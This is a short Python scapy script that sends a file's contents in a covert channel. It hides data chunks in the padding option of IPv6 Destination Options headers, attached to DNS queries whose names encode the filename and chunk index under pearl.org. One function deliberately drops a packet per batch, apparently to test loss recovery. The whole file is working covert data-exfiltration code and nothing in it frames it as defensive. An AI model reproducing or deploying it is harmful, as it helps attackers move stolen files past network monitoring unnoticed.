import getinfo
from scapy.all import *
def complete_send(filename, cwlist, cw_cnt, last):
    dnsMAC, dnsIP = getinfo.dst_addrs()
    whohas_pre = filename + '.' + str(cw_cnt) + '.'
    print("--> <filename>.<codeword_cnt>.<codeword_index>.<last_bytes>.pearl.org")
    for cw in range(cw_cnt):
        for i in range(16):
            whohas = whohas_pre + str(cw) + '.' + str(last) + '.pearl.org'
            pkt = IPv6(dst=dnsIP)/IPv6ExtHdrDestOpt(options=PadN(otype=30, optdata=cwlist[cw][i]))/UDP(dport=53)/DNS(id=i, qd=DNSQR(qname=whohas, qtype="A"))
            send(pkt, verbose=0)
            print("Packets sended: index [{}]".format(cw * 16 + i), end = '\r')
    return cw_cnt*16

def pkt_loss_send(filename, cwlist, cw_cnt, last):
    dnsMAC, dnsIP = getinfo.dst_addrs()
    whohas_pre = filename + '.' + str(cw_cnt) + '.'
    for cw in range(cw_cnt):
        for i in range(15):
            whohas = whohas_pre + str(cw) + '.' + str(last) + '.pearl.org'
            pkt = IPv6(dst=dnsIP)/IPv6ExtHdrDestOpt(options=PadN(otype=30, optdata=cwlist[cw][i]))/UDP(dport=53)/DNS(id=i, qd=DNSQR(qname=whohas, qtype="A"))
            send(pkt, verbose=0)
            print("Packets sended: index [{}]".format(cw * 16 + i), end = '\r')
    return cw_cnt*15
